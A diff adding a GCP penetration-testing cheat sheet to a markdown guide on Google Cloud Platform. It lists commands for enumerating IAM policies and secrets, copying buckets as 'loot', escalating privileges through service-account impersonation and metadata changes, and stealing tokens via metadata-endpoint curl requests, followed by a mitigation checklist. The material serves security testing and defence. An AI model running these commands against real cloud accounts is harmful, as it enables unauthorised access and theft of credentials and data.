@@ -43,3 +43,80 @@ Google Cloud Platform (GCP) is a suite of cloud computing services provided by G
 - GCP provides detailed documentation and tutorials to help you understand and use their services.
 
 GCP, like AWS and Azure, offers a broad range of services. Starting with specific services based on your needs and gradually expanding your knowledge will help you make the most of Google Cloud Platform.
+
+---
+
+# GCP Penetration Testing
+
+## Setup
+
+```bash
+# Install gcloud SDK, then authenticate
+gcloud auth login
+gcloud auth activate-service-account --key-file=key.json   # if you found a SA key
+
+gcloud config list
+gcloud projects list
+gcloud config set project <project-id>
+```
+
+## Enumeration
+
+```bash
+# What can this identity do? (test permissions)
+gcloud projects get-iam-policy <project-id>
+gcloud iam service-accounts list
+gcloud iam service-accounts keys list --iam-account <sa>@<project>.iam.gserviceaccount.com
+
+# Compute, buckets, functions
+gcloud compute instances list
+gsutil ls                                   # list buckets
+gsutil ls -r gs://target-bucket             # recurse
+gsutil cp -r gs://target-bucket ./loot      # exfil
+gcloud functions list
+
+# Secrets
+gcloud secrets list
+gcloud secrets versions access latest --secret=<name>
+```
+
+## Common privilege-escalation paths
+
+- **iam.serviceAccounts.getAccessToken** / **actAs** → impersonate a higher-priv SA:
+
+```bash
+gcloud auth print-access-token --impersonate-service-account=admin-sa@proj.iam.gserviceaccount.com
+```
+
+- **iam.serviceAccountKeys.create** → mint a persistent key for a privileged SA.
+- **compute.instances.setMetadata** → add an SSH key or startup script to run as root.
+- **Metadata SSRF** on a GCE instance → steal the SA token:
+
+```bash
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" -H "Metadata-Flavor: Google"
+```
+
+## Automated tooling
+
+```bash
+# GCPBucketBrute — find open/misnamed buckets
+python3 gcpbucketbrute.py -k target
+
+# Enumerate/exploit IAM privesc paths
+gcp_scanner                     # Google's own SA-key scanner
+prowler gcp
+scout suite gcp
+```
+
+## Mitigation checklist
+
+- Least-privilege IAM; avoid primitive roles (Owner/Editor); no SA key files—use Workload Identity.
+- Restrict metadata access; disable legacy metadata endpoints.
+- Uniform bucket-level access; block public buckets; enable VPC-SC.
+- Enable Security Command Center + audit logs; alert on IAM changes.
+
+## Related
+
+- [Top Cloud Security Risks](Top%20Cloud%20Security%20Risks.md)
+- [Kubernetes Security](../Containers/Kubernetes%20Security.md) (GKE)
